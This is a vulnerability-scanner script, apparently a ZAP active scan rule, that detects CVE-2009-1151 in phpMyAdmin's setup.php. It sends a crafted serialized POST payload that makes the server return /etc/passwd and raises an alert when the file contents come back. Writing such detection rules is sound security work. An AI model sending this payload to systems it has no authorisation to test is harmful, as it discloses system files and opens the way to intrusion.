var RISK = 3 // 0: info, 1: low, 2: medium, 3: high
var CONFIDENCE = 3 // 0: falsePositive, 1: low, 2: medium, 3: high, 4: confirmed
var TITLE = "[CVE-2009-1151] PhpMyAdmin Scripts/setup.php Deserialization Vulnerability"
var DESCRIPTION = "Setup script used to create PhpMyAdmin configurations can be fooled by using a crafted POST request to include arbitrary PHP code in the generated configuration file. Combined with the ability to save files on server, this can allow unauthenticated users to execute arbitrary PHP code."
var SOLUTION = "Upgrade to the latest version."
var REFERENCE = "https://www.phpmyadmin.net/security/PMASA-2009-3/"
var OTHER = "see: https://github.com/vulhub/vulhub/tree/master/phpmyadmin/WooYun-2016-199433"

function scanNode(as, msg) {

	if (msg.getRequestHeader().getURI().getPath() == null ||
		msg.getRequestHeader().getURI().getPath().length() == 1) {

		// Copy requests before reusing them
		msg = msg.cloneRequest();

		msg.getRequestHeader().getURI().setPath("/scripts/setup.php")
		msg.getRequestHeader().setMethod("POST")
		msg.getRequestHeader().setHeader("Content-Type", "aapplication/x-www-form-urlencoded")
		msg.getRequestBody().setBody("action=test&configuration=O:10:\"PMA_Config\":1:{s:6:\"source\",s:11:\"/etc/passwd\";}")

		print('[CVE-2009-1151] scan called for url=' + msg.getRequestHeader().getURI().toString());

		// sendAndReceive(msg, followRedirect, handleAntiCSRFtoken)
		as.sendAndReceive(msg, true, true);

		var re = new RegExp("root:.*:0:0:", 'g')

		// Test the response here, and make other requests as required
		if (msg.getResponseHeader().getStatusCode() == 200 &&
			msg.getResponseBody().toString().match(re)) {

			as.newAlert()
				.setRisk(RISK)
				.setConfidence(CONFIDENCE)
				.setName(TITLE)
				.setDescription(DESCRIPTION)
				.setEvidence(msg.getRequestHeader().getURI().toString())
				.setOtherInfo(OTHER)
				.setSolution(SOLUTION)
				.setReference(REFERENCE)
				.setMessage(msg)
				.raise()
		}
	}
	return
}

function scan(as, msg, param, value) {
	return
}
